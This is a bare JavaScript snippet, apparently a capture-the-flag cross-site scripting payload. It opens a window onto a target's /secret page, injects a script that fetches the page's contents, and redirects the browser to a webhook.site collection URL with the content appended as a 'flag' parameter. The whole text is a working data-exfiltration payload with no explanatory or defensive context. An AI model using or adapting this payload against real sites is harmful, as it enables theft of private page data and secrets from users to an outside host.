let value = window.open('http://20.235.243.131:8443/secret');
value.document.write('<script>fetch("http://20.235.243.131:8443/secret").then(data => data.text()).then(flag => {window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag})</script>');
